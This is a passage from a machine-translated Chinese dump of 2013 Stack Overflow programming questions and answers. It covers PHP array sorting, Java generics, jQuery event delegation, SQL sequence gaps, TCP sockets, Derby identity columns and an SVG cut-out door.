如果您也希望它们的顺序正确，请确保将所有字符串键保持小写。这会将字符串放在所有整数之后。

下面是该方法的一个示例：http: [//codepad.org/IBc3wnso](http://codepad.org/IBc3wnso)

我能想到的首先*简单地*获取非`int`键的唯一方法是在它们前面加上`--`：

```
<?

$keys = array('--m2' => 1, -500 => 1, 0 => 1, 1000 => 1, '--m1' => 1, 5000 => 1, );

ksort($keys, SORT_STRING);

foreach($keys as $k => $v){
    echo $k . "\n";
}

?> 
```

将返回：

```
--m1
--m2
-500
0
1000
5000 
```

示例：[http ://codepad.org/rwbrj3rJ](http://codepad.org/rwbrj3rJ)

不过，这有点骇人听闻。可能有更好的方法来实现这一点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:13:50.397

如果您想要单个字符作为数组键，请尝试 chr(0) 和 chr(255)。

等一下：如果您不断更改问题，则很难回答。

您有 -500 作为键：这不是单个字符。

然后，使用 -PHP_INT_MAX 作为下限值，使用 PHP_INT_MAX 作为上限值。

# objective-c - Objective-C (OSX) 中的程序目录

> ID：15092545
> 
> 赞同：5
> 
> 时间：2013-02-26T15:10:57.763
> 
> 标签：objective-c, xcode, macos

我正在开发一个 OSX 应用程序，在其中，我想知道当前目录是什么（即保存 .app 文件的目录）。

目前，我正在使用以下代码：

```
NSString *dir=[[NSFileManager defaultManager] currentDirectoryPath];
[[NSAlert alertWithMessageText:@"dir"
                 defaultButton:@"OK"
               alternateButton:nil
                   otherButton:nil
     informativeTextWithFormat:dir] runModal]; 
```

从 Xcode（运行按钮）运行时，这给了我调试目录（这*是*我正在寻找的），但是当在 Finder 中双击应用程序时（所以，在调试目录中），它给了我`/`哪些难题我。

为什么会发生这种情况，如何可靠地获取当前目录？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-26T15:16:09.893

那是捆绑文件夹：

```
NSString *appPath = [[NSBundle mainBundle] bundlePath]; 
```

（[参考](https://developer.apple.com/library/mac/documentation/Cocoa/Reference/Foundation/Classes/NSBundle_Class/Reference/Reference.html#//apple_ref/occ/instm/NSBundle/bundlePath)）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-08-27T11:41:12.723

When programming in Apple Swift you will get the application path with:

```
let pathtoapplication: String = NSBundle.mainBundle().bundlePath 
```

# php - 使用javaScript在linux环境下获取内网客户端主机名

> ID：15092552
> 
> 赞同：4
> 
> 时间：2013-02-26T15:11:22.270
> 
> 标签：php, javascript, jquery, linux, hostname

我正在寻找一种方法来返回客户端的主机名，我看过几篇帖子说无法获取机器名称，但我认为可以将它放在内部网上。

这是可能的 ？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:19:55.870

浏览器不提供用于 JavaScript 的 API 来访问客户端的主机名。

在 Intranet 上，您可以运行一个 Web 服务，该服务根据请求来自的 IP 地址执行反向 DNS 查找，然后通过 Ajax 调用该 Web 服务。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:35:12.570

在 php 中：

```
 $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
  echo $hostname; 
```

# java - 具有多个边界的成员类型

> ID：15092553
> 
> 赞同：3
> 
> 时间：2013-02-26T15:11:25.530
> 
> 标签：java, generics

所以我才知道我可以

```
public <T extends SomeClass & SomeInterface<OtherClass>> doSomething(T foo); 
```

在 Java 中表示`foo`扩展`SomeClass`并实现`SomeInterface<OtherClass>`. 到目前为止，一切都很好。

但是我将如何分配`foo`给`doSomething()`成员变量？该类当然不知道附加到该`doSomething()`方法的任何类型定义。

我需要 this 的上下文是一个 POJO，它的构造函数需要用 said 进行参数`T`化，并且需要`T`再次返回 said。

我最接近的是以下内容：

```
public class ThisClass implements AnotherInterface<AnotherClass> {

    private final Object obj;

    public <U extends SomeClass & SomeInterface<AnotherClass>> ThisClass(U obj) {
        this.obj = obj;
    }

    public <U extends SomeClass & SomeInterface<AnotherClass>> U getObject() {
        return (U) obj;
    }
} 
```

但是如果没有未经检查的演员表，我无法绕开脑袋来找到解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:14:37.447

你不能让这个类通用：

```
public class ThisClass<U extends SomeClass & SomeInterface<AnotherClass>>
                                   implements AnotherInterface<AnotherClass> {

    private final U obj;

    public ThisClass(U obj) {
        this.obj = obj;
    }

    public U getObject() {
        return obj;
    }
} 
```

并像这样使用它：

```
ThisClass<String> instance = new ThisClass<>("Foo");
String value = instance.getObject(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T16:50:01.543

不幸的是，它无法完成。问题是 Java 没有可表示的拦截类型`A&B`。

如果 Java 有这个，我们可以写类似的东西

```
 Pet&Furry pet;

    void set(Pet&Furry pet){ this.pet=pet; }

    Pet&Furry get(){ return pet; } 
```

现在，类型变量可以有拦截边界`A&B`，所以有人会认为我们可以利用它

```
 Object pet;

    <U extends Pet&Furry> void set(U pet){ this.pet=pet; }

    <U extends Pet&Furry> U get(){ return (U)pet; } 
```

但它不是类型安全的。考虑

```
 x.set(dog); 
    ...
    Cat cat = x.get(); 
```

如果我们要求程序员在精神上跟踪实际类型，我们可能会承受这种风险。

# c# - 如何将任何 HtmlControl 作为参数传递给函数

> ID：15092554
> 
> 赞同：0
> 
> 时间：2013-02-26T15:11:28.790
> 
> 标签：c#, asp.net

刚刚编写了一个函数来检查 HTML 控件是否隐藏。如何将参数 myControl 的类型 System.Web.UI.HtmlControls.HtmlTableRow 更改为支持任何 HTML 控件类型的类型。我宁愿不为任何 html 控件编写特定函数。

```
 public static bool IsUIElementHidden(System.Web.UI.HtmlControls.HtmlTableRow myControl)
        {            
            if ((myControl.Style["display"] ?? "").ToLower().Equals("none") || (myControl.Style["visibility"] ?? "").ToLower().Equals("none"))
            {
                return true;
            }
            else
            {
                return false;
            }
        } 
```

我尝试使用 WebControl 类型，但是当我将控件传递给函数时出现错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:16:59.180

以下是基于对象层次结构的选择：

```
System.Object 
  System.Web.UI.Control
    System.Web.UI.HtmlControls.HtmlControl
      System.Web.UI.HtmlControls.HtmlContainerControl
        System.Web.UI.HtmlControls.HtmlTableRow 
```

考虑到这`Style`是继承自我`System.Web.UI.HtmlControls.HtmlControl`会选择：

```
static bool IsUIElementHidden(System.Web.UI.HtmlControls.HtmlControl myControl) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:19:27.817

您正在寻找`Style`属于 的财产`System.Web.UI.HtmlControls.HtmlControl`。

所以这应该工作：

```
public static bool IsUIElementHidden(System.Web.UI.HtmlControls.HtmlControl myControl)
        {            
            if ((myControl.Style["display"] ?? "").ToLower().Equals("none") || (myControl.Style["visibility"] ?? "").ToLower().Equals("none"))
            {
                return true;
            }
            else
            {
                return false;
            }
        } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T19:47:13.023

假设您只希望传递给函数的控件类型很少，您可以传递一个通用控件和一个字符串来确定要转换为哪种控件。然后，在您的函数中，将通用控件转换为特定类型。

```
 Private Sub setControl(ByVal control As Control, ByVal myType As String)
       Select Case myType 
            Case myType  = "label"
                Dim newLabel As New Label
                newLabel = CType(control, Label)

            Case myType  = "textbox"
                Dim newTextBox As New TextBox
                newTextBox = CType(control, TextBox)
        End Select
 end sub 
```

您甚至可以放弃字符串并使用反射来确定它是什么类型的控件。

# c - 使用 TCP/IP 套接字检查已将多少数据传送到目的地

> ID：15092558
> 
> 赞同：3
> 
> 时间：2013-02-26T15:11:41.847
> 
> 标签：c, sockets, tcp

我正在开发一个需要向客户端发送大量数据的服务器应用程序。但是，客户端可以随时断开连接，并且在这种情况下，套接字上的 send()/write() 将返回错误。我想检查在客户端断开连接之前实际传递了多少数据，以便能够在客户端重新连接时从中断的地方继续发送数据。

是否可以使用套接字 API 进行检查？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-26T15:21:51.650

不，套接字 API 不会为您提供此信息。事实上，一般情况下不可能知道这一点。根据连接失败的特定方式，一侧的 TCP 堆栈通常无法知道有多少数据成功到达另一侧。它唯一能知道的是确认了多少数据，这不是一回事。并且考虑到 TCP/IP 以外的其他事情可能已经失败（本地操作系统、远程操作系统、远程进程、远程应用程序逻辑），在 TCP 级别已确认的数据量可能并不意味着什么.

您需要使用端到端应用程序协议让远程端确认它已接收并成功处理（并提交，如果适用）的数据。

# c - 将数组的值传递到循环的开头

> ID：15092561
> 
> 赞同：0
> 
> 时间：2013-02-26T15:11:44.750
> 
> 标签：c, arrays

我的目标是让用户查看输入命令的历史记录（`historyArray`-done），并允许他重新运行历史记录中的任何命令，方法是输入`history 1`, `history 2`where`1`和`2`is the number of commands as print out from `historyArray`。我已经设法从`history 1`用户​​输入的第二个参数 () 中获取索引。我现在的问题是，如何执行从 获得的特定命令`history N`？

因此，例如：

```
 hshell> test [Enter]
     Command not found
     hshell> history 1
     Command not found 
```

这是我的进展：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main (int argc, char *argv[])
{
    int i=0; int j=0; int k=0;
    int elementCounter = 0;
    char inputString[100];
    char *result=NULL;
    char delims[] = " ";
    char historyArray[30][20] = {0};
    char tokenArray[20][20] ;
    int tempIndex = 0;
    char hCommand[2][20]={0};

    do
    {
             j = 0;
             printf("hshell>");
             gets(inputString);

             strcpy (historyArray[k], inputString);
             k = (k+1) % 20;

            if (elementCounter <= 20)
             {         
              elementCounter++;                
             }

             if (elementCounter == 21)
             {
                k = 20;
                for (i=0; i<20; i++)
                {
                    strcpy(historyArray[i], historyArray[i+1]);
                }
                 strcpy (historyArray[19], inputString);                 
             }

             // Break the string into parts
             result = strtok(inputString, delims);

             while (result!=NULL)
             {
                  strcpy(tokenArray[j], result);
                   j++;
                  result= strtok(NULL, delims);                      
             }

              if (strcmp(tokenArray[0], "exit") == 0)
              {
                 return 0;
              }
              else if (strcmp(tokenArray[0], "history") ==  0)
              {
                   if (j>1)
                   { 
                      tempIndex = atoi(tokenArray[1]);
                     strcpy(hCommand,historyArray[tempIndex-1]);
                     puts(hCommand);
                    // tempIndex = atoi(tokenArray[j]);
                     //puts(tempIndex);
                   }
                   else
                   {
                       //print history array
                       for (i=0; i<elementCounter-1;i++)
                           printf("%i. %s\n", i+1, historyArray[i]);
                   }
              }
              else
              {
                  printf("Command not found\n");
              }

    }while (1);
} 
```

*   `hCommand`是我存储从`historyArray`.
*   我正在使用 Windows 机器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:15:48.007

在获得您要执行的命令的名称后，我建议您通过系统调用[**exec**](http://linux.die.net/man/3/exec)。考虑到**exec**将当前进程映像替换为您要执行的进程映像。[**否则你可能会对fork**](http://linux.die.net/man/3/fork)感兴趣。

**EDIT#1**然后我相信你需要[**这个 API**](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682425%28v=vs.85%29.aspx)。请注意，我不熟悉哪些功能与我首先提供的功能等效。稍微花点时间你就能弄清楚，对吧？:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:34:24.677

您可以使用 stdlib.h 中的“系统”功能。

```
#include <stdlib.h>
int system(const char *command); 
```

这个函数包含在 windows 和 *nix 中。您无需担心打电话`fork`或`CreateProcess`单独打电话，这将为您处理。有关详细信息，请参阅[MSDN 文档](http://msdn.microsoft.com/en-us/library/277bwbdz%28v=vs.71%29.aspx)。

在您的代码中，您将编写：

```
system(hCommand); 
```

当命令完成时它将返回（这是一个同步调用）。

# groovy - 尝试删除工件时身份验证不起作用（“HttpResponseException：Forbidden”）

> ID：15092565
> 
> 赞同：0
> 
> 时间：2013-02-26T15:12:06.073
> 
> 标签：groovy, artifactory

我正在尝试使用在 Jenkins 任务中运行的 Groovy 脚本从 Artifactory 存储库中删除工件。该脚本在我的存储库的给定路径中收集与时间戳匹配的所有工件，然后尝试从存储库中删除它们。

脚本的有趣部分如下所示：

```
def base.url = 'http://name:port'
def repo = 'my-repo'
def path = 'my-path'
def artifact = 'my-artifact'
def url.to.delete = base.url + '/artifactory/' + repo + '/' + path + '/' + artifact 
print "url.to.delete = " + url.to.delete

def server = new RESTClient(base.url)
server.auth.basic('user', 'password')   
def resp = server.delete(path: url.to.delete) 
```

删除语句导致此异常

```
groovyx.net.http.HttpResponseException: Forbidden
    at groovyx.net.http.RESTClient.defaultFailureHandler(RESTClient.java:240)
    at groovyx.net.http.HTTPBuilder.doRequest(HTTPBuilder.java:508)
    at groovyx.net.http.RESTClient.delete(RESTClient.java:196)
    at groovyx.net.http.RESTClient$delete.call(Unknown Source)
    at Artifactory$_deleteartifactsWithTimestamps_closure2.doCall(hudson4086512083232103441.groovy:87)
    at Artifactory.deleteartifactsWithTimestamps(hudson4086512083232103441.groovy:80)
    at Artifactory$deleteartifactsWithTimestamps.callCurrent(Unknown Source)
    at Artifactory.deleteSnapshots(hudson4086512083232103441.groovy:32)
    at Artifactory$deleteSnapshots.call(Unknown Source)
    at hudson4086512083232103441.run(hudson4086512083232103441.groovy:170) 
```

计算出的 url.to.delete 似乎是正确的——如果我从日志中复制它并将其粘贴到浏览器的地址字段中，则工件将被毫无问题地下载。可以从 Groovy 脚本访问 Artifactory - 收集路径的工件的 GET 使用相同的数据可以正常工作。

我使用 Artifactory 2.6.4（免费版！）、带有 http-builder-0.6.jar 的 Groovy 2.1.1。

谢谢你的帮助！

坦率

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:45:51.337

您的用户可能没有删除权限。您的回复表明客户调用是正确的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T14:49:47.287

问题是“允许匿名访问”已打开。关闭此功能后，可以使用基本身份验证。

# media - 如何判断何时在 Wordpress 3.5 媒体编辑器中进行选择

> ID：15092566
> 
> 赞同：1
> 
> 时间：2013-02-26T15:12:07.400
> 
> 标签：media, wordpress-3.5

我正在尝试绑定到在新的 Wordpress 媒体上传器中选择项目时发生的“selection:single”触发器。

我可以看到在媒体 models.js 的第 895 行有这个触发器

```
this._single.trigger( 'selection:single', this._single, this ); 
```

但是我无法确定应该将侦听器绑定到什么，以便在发生这种情况时获取发送的数据。

我只是使用 wp.media.editor.open() 在前端创建的媒体编辑器的默认部署...

一直在寻找一天，找不到解决方案:(

# vb.net - 在不删除的情况下将文本添加到 Richbox

> ID：15092570
> 
> 赞同：0
> 
> 时间：2013-02-26T15:12:13.220
> 
> 标签：vb.net, visual-studio, checkbox, console

我尝试编写一个程序如何在 Richbox 中告诉我我要做什么，例如，当我在 RichBox 中单击一个启用时，我有 4 个 CheckBoxes 必须启用苹果...梨禁用...所以我有苹果梨胡萝卜花生和 Richbox需要看起来像，

梨禁用...胡萝卜禁用...花生启用...梨启用....提交成功！梨禁用...我尝试为每个复选框但是当我检查一个richbox被重置并且只出现一行

```
 If CheckBox2.Checked = True Then
        RichTextBox1.Text = "pear enabled..."
    Else
        RichTextBox1.Text = "pear disabled..."
    End If 
```

我能做些什么 ？谢谢 ！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:26:11.320

您可以简单地使用富文本框控件的 SelectedText 属性来正确附加文本。请看下面的代码..

公开课形式1

```
Private Sub CheckBox1_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox1.CheckedChanged
    If (CheckBox1.Checked) Then
        RichTextBox1.SelectedText = CheckBox1.Text & " Enabled" & vbCrLf
    Else
        RichTextBox1.SelectedText = CheckBox1.Text & " Disabled" & vbCrLf
    End If

End Sub

Private Sub CheckBox2_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox2.CheckedChanged
    If (CheckBox1.Checked) Then
        RichTextBox1.SelectedText = CheckBox2.Text & " Enabled" & vbCrLf
    Else
        RichTextBox1.SelectedText = CheckBox2.Text & " Disabled" & vbCrLf
    End If

End Sub

Private Sub CheckBox3_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox3.CheckedChanged
    If (CheckBox1.Checked) Then
        RichTextBox1.SelectedText = CheckBox2.Text & " Enabled" & vbCrLf
    Else
        RichTextBox1.SelectedText = CheckBox2.Text & " Disabled" & vbCrLf
    End If
End Sub 
```

结束类

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:18:10.923

也许你需要这个：

```
If CheckBox2.Checked = True Then
    RichTextBox1.Text &= "pear enabled..." & Environment.NewLine()
Else
    RichTextBox1.Text &= "pear disabled..." & Environment.NewLine()
End If 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T15:14:18.143

您要查找的词是“附加”文本。

RichTextBox1.AppendText("pear enabled...")

# eclipse-plugin - 使用 xulrunner 创建 Mozilla 的 swt.browser 发生错误

> ID：15092574
> 
> 赞同：0
> 
> 时间：2013-02-26T15:12:17.570
> 
> 标签：eclipse-plugin, swt, mozilla, xulrunner, jgraph

我使用 mozilla 的 org.eclipse.swt.browser 和 xulrunner 加载网页内容，但我得到错误：<br> `Unhandled event loop exception XPCOM error -2147467261`
我的开发环境：
操作系统：win7 * 32bit
Eclipse：3.7.2 * 32bit
SWT：32bit
xulrunner：发布 18.0
代码像这样：

```
//register xulrunner path
static{
     System.setProperty("org.eclipse.swt.browser.XULRunnerPath", "F:/soft/xulrunner18/xulrunner"); 
   }
...

//create Mozilla browser
browser = new Browser(parent, SWT.MOZILLA);  //error was caused here. 
```

有谁知道原因，或者告诉我如何找到原因？
非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T18:06:33.087

显然，SWT.Browser 还不能与 Xulrunner 17+ 一起使用。

您可以在此处获得 10esr 版本的独立副本：http: [//ftp.mozilla.org/pub/mozilla.org/xulrunner/releases/10.0.4esr/runtimes/](http://ftp.mozilla.org/pub/mozilla.org/xulrunner/releases/10.0.4esr/runtimes/)

然后，您需要在运行配置参数中指定 xulrunner 路径： `-Dorg.eclipse.swt.browser.XULRunnerPath=C:\path\to\xulrunner\`

# excel - 如果满足某些条件，则弹出消息框

> ID：15092576
> 
> 赞同：0
> 
> 时间：2013-02-26T15:12:22.723
> 
> 标签：excel, vba

我正在制作成本表。我输入的每个成本行项目都有一个需要更新成本的有效日期。我正在尝试弹出一个消息框，以在费用超过其有效期时通知我。在我的电子表格中，有效日期在 D 列的“报价单”上，而实际日期在单元格 B2 的“数据输入”表上。I also have check boxes to select which cost items you want included which when selected populate column Q with a True or False. 我要做的是做一个在选择项目时运行的宏。所以措辞类似于，“如果列 Q = True 并且如果列 D 小于“数据输入”上的单元格 B2，则 MsgBox“价格已过时！”” 我也有小计，其中日期为空白，所以我需要说明如果 D 列为空白，则忽略。谢谢你的帮助！我在网上找到了以下内容并尝试过，但没有成功。

```
Private Sub Worksheet_Change(ByVal Target As Range)
'Only run if change made to D3, and D2 and D3 are not = ""
If Intersect(Target, Range("D:D")) Is Nothing Then Exit Sub

If Range("D:D").Value < Sheets("Data Entry").Range("B2").Value Then
MsgBox "Cost is out of date!"
End If

End Sub 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:54:20.067

您需要在第一个 IF 构造中添加一个条件以检查空白单元格，并在第二个 IF 构造中将 Range("D:D") 添加到 Target：

```
Private Sub Worksheet_Change(ByVal Target As Range)
'Only run if change made to D3, and D2 and D3 are not = ""
If Intersect(Target, Range("D:D")) Is Nothing or IsEmpty(Target) Then Exit Sub

If Target.Value < Sheets("Data Entry").Range("B2").Value Then
   MsgBox "Cost is out of date!"
End If 
```

# c# - 弱组装改为强组装

> ID：15092577
> 
> 赞同：2
> 
> 时间：2013-02-26T15:12:31.567
> 
> 标签：c#, reflection, .net-assembly, weak-references, strongname

我有一个插件结构，它都是使用弱程序集编译的。我现在想改变这一点，但遇到了一些困难。

```
interface.dll contains my interface for my plugins (IPlugin)
Load.exe will load all the plugin implementations which implements IPlugin
pluginA.dll contains a implementation of IPlugin 
```

所有组件都是原始弱组件。

我现在想将程序集更改为强名称程序集。

制作 interface.dll 和 load.exe 强名称程序集后，我无法创建 pluginA.dll IPlugin 实现的实例，除非我重新编译 pluginA.dll 以引用新的强名称 interface.dll

有没有办法让我在 interface.dll 和 load.exe 上设置强名称，而不必重新编译所有实现 IPlugin 的插件？

我问这个的原因是我有很多插件，但我无法控制所有插件。因此，当我使用强名称更新 interface.dll 时，我想避免破坏插件功能。

我希望你能帮助我，如果有不清楚的地方，请随时询问更多细节。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T18:05:17.270

为程序集起一个强名称是一项艰难的突破性更改。您无法使用配置文件或发布者策略对其进行修补。所以重建插件是一个你不能跳过的硬性要求。

您没有另外说明决定这样做的原因。在插件方案中没有引人注目的。强名称提供了一种方法来验证程序集是否与构建程序的参考程序集*完全匹配。*但是，根据设计，您没有插件的参考程序集*。*所以没有什么可以验证的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T16:01:17.990

不幸的是，没有办法解决这个问题。如果您可以引用简单命名的程序集，那么您从对程序集进行强命名（很可能是您转换程序集的原因）中获得的好处就会丢失。

来自微软的[文档](http://msdn.microsoft.com/en-us/library/wd40t7ad.aspx)：

> 当您引用强名称程序集时，您期望获得某些好处，例如版本控制和命名保护。如果强名称程序集随后引用了一个没有这些好处的简单名称的程序集，则您将失去使用强名称程序集所获得的好处并恢复为 DLL 冲突。因此，强名称程序集只能引用其他强名称程序集。

# jquery - on() 与 live() 在尚不存在的元素上单击功能

> ID：15092578
> 
> 赞同：12
> 
> 时间：2013-02-26T15:12:35.827
> 
> 标签：jquery, onclick, onclicklistener

据我所知，该`click()`方法对我不起作用，因为我单击的元素在页面加载时不存在（DOM 就绪）。

我发现很多答案建议使用`.live('click',function(){...})`. 这很好用！

但是，`.live()`从 jQuery 1.7 开始被贬值

所以，我尝试过使用`.on('click',function(){...})`，但它不起作用（与`.click()`.

有谁知道为什么，或者我可以做些什么来使用`.on()`类似于`.live()`（哪个有效）？

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2013-02-26T15:13:52.597

由于`on()`替换了`bind()`and `live()`，您需要传递第三个参数才能使用事件委托（换句话说，使其像旧的一样工作`live()`）：

```
$('#container').on('click', '.element', function(){ }); 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-02-26T15:14:29.163

您应该能够使用如下格式：

```
$(document).on('click','element', function(){...}); 
```

`element`您要将点击事件绑定到的元素在哪里。使用`document`是一种最坏的情况，因为理想情况下，您希望使用加载 DOM 时存在的元素，该元素在 DOM 层次结构中更接近将动态加载的元素。

来自 jQuery [.on()](http://api.jquery.com/on/)文档：

> 事件处理程序仅绑定到当前选定的元素；当您的代码调用 .on() 时，它们必须存在于页面上。为确保元素存在并且可以被选择，请在页面 HTML 标记中的元素的文档就绪处理程序内执行事件绑定。如果将新 HTML 注入页面，请在将新 HTML 放入页面后选择元素并附加事件处理程序。

# sql - 如何找到整数序列中的第一个中断点？

> ID：15092580
> 
> 赞同：2
> 
> 时间：2013-02-26T15:12:46.637
> 
> 标签：sql, tsql, sql-server-2005, integer

假设您有以下表格：

```
create table #myvalues(mykey int primary key) 
```

您还具有以下值：

```
insert into #myvalues(mykey) values(1)
insert into #myvalues(mykey) values(2)
insert into #myvalues(mykey) values(4)
insert into #myvalues(mykey) values(5)
insert into #myvalues(mykey) values(6)
insert into #myvalues(mykey) values(8)
insert into #myvalues(mykey) values(10)
insert into #myvalues(mykey) values(11)
insert into #myvalues(mykey) values(12)
insert into #myvalues(mykey) values(15)
insert into #myvalues(mykey) values(17)
insert into #myvalues(mykey) values(20) 
```

您还有一个当前值：

```
declare @currentvalue int

select @currentvalue = 5 
```

我想在@currentvalue 之后找到此序列中的第一个中断。在这种情况下，答案是 7。

我可以使用表变量并使用 while 循环遍历记录，但必须有更好的方法。

有什么建议么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T15:15:45.590

```
WITH list
AS
(
    SELECT  myKey,
            ROW_NUMBER() OVER (ORDER BY myKey ASC) rn
    FROM    #myvalues
)
SELECT  TOP 1 rn
FROM    list
WHERE   myKey <> rn 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!3/49ed9/4)

这是占用的查询`starting value`

```
DECLARE @currentValue INT 
SET @currentValue = 5

;WITH list
AS
(
    SELECT  myKey,
            ROW_NUMBER() OVER (ORDER BY myKey ASC) + (@currentValue - 1) rn
    FROM    myvalues
    WHERE   myKey >= @currentValue 
)
SELECT  TOP 1 rn 
FROM    list
WHERE   myKey <> rn 
```

*   [SQLFiddle Demo（*带起始编号*）](http://www.sqlfiddle.com/#!3/49ed9/20)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-26T15:18:42.980

您可以自行加入表：

```
select top 1 t.mykey + 1
from myvalues t
left join myvalues x on x.mykey = t.mykey + 1
where t.mykey > @currentvalue and x.mykey is null
order by t.mykey 
```

演示：[http ://www.sqlfiddle.com/#!2/c6dd2/7](http://www.sqlfiddle.com/#!2/c6dd2/7)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-26T15:22:00.040

```
select top 1 myKey+1 from #myvalues
where 
    (myKey+1) not in (select mykey from #myvalues)
    and mykey >= @currentValue 
```

# php - $_GET、$_POST 和 $_REQUEST 未填充

> ID：15092581
> 
> 赞同：2
> 
> 时间：2013-02-26T15:12:47.773
> 
> 标签：php, post, get

我继承了一台运行 xitami/pro 服务器的 XP 机器并安装了 PHP 5.2.17，因为我认为我可能需要 VC6 版本。

PHP 可以正常工作并按`phpinfo`应有的方式显示。当我这样做时`www.domain.com/test.php?x=y&z=test`，`$_GET`没有被填充。

该`$_REQUEST`变量也没有被填充。如果我将其以表格形式发布并发布，`$_POST`则. 和`$_REQUEST`.

如果我遍历`$_SERVER`变量并在 get 上显示它们，则将`QUERY_STRING`填充 get 变量。

当我`print_r`对任何变量执行 a 时，它是空的。我得到：`Array ( ) 1`

然后我升级到 PHP 5.4 和同样的东西。

问题是什么？我很茫然，不知道还能尝试什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:22:48.373

我怀疑当服务器配置错误时会出现这个问题。特别是当使用了错误的 SAPI 时（例如，我很确定`$_GET`/在使用[PHP CLI](http://www.php.net/manual/en/features.commandline.differences.php)`$_POST`时不可用。

要查看这是否会导致您的问题，请创建一个新的 php 文件，然后插入以下内容

```
<?php
  echo php_sapi_name();
?> 
```

如果这返回`CLI`，我很确定这会导致您的问题。通过配置您的服务器以使用正确的 SAPI 来解决它。

TL;DR：
我假设您正在使用`C:\php\php.exe`您的 PHP 解释器。试试`C:\php\php-cgi.exe`吧。

# java - 使用 derby 数据库和 netbeans ide 创建触发器

> ID：15092587
> 
> 赞同：0
> 
> 时间：2013-02-26T15:13:01.970
> 
> 标签：java, sql, netbeans, derby

我正在使用 derby 数据库和 netbeans IDE 开发一个简单的桌面应用程序，我有一个带有唯一字段的 ID 列的表。

首先，我不想手动插入 ID 列，其次看起来 derby DB 没有像 mySQL 那样的自动增量系统。

为了解决这个问题，我想在执行插入操作时使用 BEFORE TRIGGER 插入表中。

有没有人知道如何在 netbeans IDE 上为 derby 数据库创建触发器。或者是否有可能有一个自动增量系统来为我增加 IDE 字段。

此致

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T14:50:38.523

Derby 确实有一个自增数据类型：它称为 GENERATED AS IDENTITY。

在此处阅读更多信息：http: [//db.apache.org/derby/docs/10.9/ref/rrefsqlj37836.html#rrefsqlj37836](http://db.apache.org/derby/docs/10.9/ref/rrefsqlj37836.html#rrefsqlj37836)

# jquery - 在门上开一个洞？

> ID：15092588
> 
> 赞同：3
> 
> 时间：2013-02-26T15:13:02.173
> 
> 标签：jquery, html, css

我有一个`<div>`木头重复的背景图像。

我现在想在这上面切一个洞来做一扇窗户。有没有办法在 HTML 和 CSS 中做到这一点？欢迎使用 Javascript。

请参阅[jsFiddle上的此示例](http://jsfiddle.net/UWyvz/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:56:31.673

`<svg>`这很简单 - 使用元素中的路径绘制门。

```
<svg  xmlns="http://www.w3.org/2000/svg" id="svg-door">
    <defs>
         <pattern id="wood" patternUnits="userSpaceOnUse" width="1024" height="768">
             <image xlink:href="http://i.imgur.com/Ljug3pp.jpg" x="0" y="0" width="1024" height="768" />
        </pattern>
    </defs>
    <path xmlns="http://www.w3.org/2000/svg" d="
        M0,0 225,0 225,300 0,300 z
        M165,10, 215,10 215,80 165,80 z
    " fill="url(#wood)" fill-rule="evenodd"/>
</svg> 
```

CSS：

```
#svg-door {
   background-image: url(http://pcdn.500px.net/15548893/7f3b7c411716b1fb29c5cffb3efcf8ce33eacd76/15.jpg);
    background-size: cover;
    box-sizing: border-box;
    padding: 100px;
    width: 100%;
    height: 500px;
} 
```

这种方法的优点是你的背景可以是任何东西，并且窗口是真正的窗口（透视）。

我已经为您预先计算了路径，您可以在我从您的小提琴中创建的叉子中找到新门 - [http://jsfiddle.net/teddyrised/qS4G7/](http://jsfiddle.net/teddyrised/qS4G7/)

[编辑] 为了完整起见，我还使用了木质纹理作为 svg 路径的背景图像。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-26T15:19:09.423

你的意思是这样吗？[http://jsfiddle.net/UWyvz/3/](http://jsfiddle.net/UWyvz/3/)

我基本上使用了一些木头并创建了一个窗格。

不，我复制了`window`，但将其命名为`windowpane`，然后将窗格设置`z-index`为低于`window`' 并将 of 设置`background-color`为`windowpane`白色。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-26T15:26:33.910

可能有点“丑陋的修复”，但它有效：使用`border-property`模拟门（元素实际上是窗户）。

**HTML**

```
<div class="door"></div> 
```

**CSS**

```
body {
